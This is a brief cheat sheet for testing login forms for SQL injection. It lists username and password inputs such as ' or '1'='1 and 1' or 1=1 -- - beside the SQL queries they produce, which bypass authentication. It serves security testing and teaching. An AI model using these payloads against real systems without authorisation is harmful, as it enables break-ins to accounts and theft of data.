# Login Form SQL Injection Testing
Below is the cheat sheet provided by OWASP from SecHow.com. This can be used to test a username or password for simple SQL injection vulnerabilities.

| User name | Password | SQL Query |
|-----------|----------|-----------|
| tom | tom	| SELECT * FROM users WHERE name='tom' and password='tom' |
| tom | ' or '1'='1 | SELECT * FROM users WHERE name='tom' and password='' or '1'='1' | 
| tom | ' or 1='1 | SELECT * FROM users WHERE name='tom' and password='' or 1='1' |
| tom	| 1' or 1=1 -- - | SELECT * FROM users WHERE name='tom' and password='' or 1=1-- -' |
| ' or '1'='1	| ' or '1'='1	| SELECT * FROM users WHERE name='' or '1'='1' and password='' or '1'='1' |
| ' or ' 1=1	| ' or ' 1=1	| SELECT * FROM users WHERE name='' or ' 1=1' and password='' or ' 1=1' |
| 1' or 1=1 -- -	| blah	| SELECT * FROM users WHERE name='1' or 1=1 -- -' and password='blah' |
